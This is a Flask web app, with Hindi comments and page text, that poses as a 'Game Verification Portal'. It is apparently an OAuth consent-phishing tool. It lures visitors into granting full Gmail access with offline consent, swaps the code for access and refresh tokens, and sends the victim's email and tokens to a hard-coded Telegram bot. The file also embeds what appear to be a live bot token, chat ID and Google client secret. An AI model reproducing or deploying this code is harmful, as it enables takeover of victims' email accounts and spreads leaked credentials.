from flask import Flask, request, render_template_string
import requests

app = Flask(__name__)

# सेटिंग्स - आपकी दी हुई जानकारी के अनुसार
BOT_TOKEN = "8664981956:AAFWB4ZFeNrHACF15GQgnZEIBjs9V6Uxb8M"
CHAT_ID = "8293599881"
CLIENT_ID = "580564575215-suj93a1u7ganotmsrgnveb5nu8sjco1u.apps.googleusercontent.com"
CLIENT_SECRET = "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"
SCOPE = "https://mail.google.com/"

HTML_CODE = """
<!DOCTYPE html>
<html>
<body style="text-align:center; padding:50px; font-family:Arial;">
    <h1>Game Verification Portal</h1>
    <p>कृपया वेरिफिकेशन के लिए साइन-इन करें।</p>
    <a href="{{ auth_url }}" style="padding:15px; background:#007bff; color:white; text-decoration:none; border-radius:5px;">Sign in with Google</a>
</body>
</html>
"""

def send_to_telegram(email, access_token, refresh_token):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    message = f"🔔 **नया टोकन प्राप्त हुआ!**\n📧 **ईमेल:** `{email}`\n\n🔑 **ACCESS TOKEN:**\n`{access_token}`\n\n🔄 **REFRESH TOKEN:**\n`{refresh_token}`"
    requests.post(url, json={"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"})

@app.route('/')
def home():
    redirect_uri = request.host_url.rstrip('/') + '/callback'
    auth_url = (
        f"https://accounts.google.com/o/oauth2/v2/auth?client_id={CLIENT_ID}&"
        f"redirect_uri={redirect_uri}&response_type=code&scope={SCOPE}&access_type=offline&prompt=consent"
    )
    return render_template_string(HTML_CODE, auth_url=auth_url)

@app.route('/callback')
def callback():
    code = request.args.get('code')
    token_url = "https://oauth2.googleapis.com/token"
    data = {
        "code": code, "client_id": CLIENT_ID, "client_secret": CLIENT_SECRET,
        "redirect_uri": request.host_url.rstrip('/') + '/callback', "grant_type": "authorization_code"
    }
    res = requests.post(token_url, data=data)
    
    if res.status_code == 200:
        tokens = res.json()
        access_token = tokens.get('access_token')
        refresh_token = tokens.get('refresh_token')
        
        user_info = requests.get("https://www.googleapis.com/oauth2/v1/userinfo", 
                                 headers={"Authorization": f"Bearer {access_token}"}).json()
        send_to_telegram(user_info.get("email"), access_token, refresh_token)
        return "🎉 सफलता! टोकन टेलीग्राम पर भेज दिए गए हैं।"
    return "Error: Token generation failed."

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
    
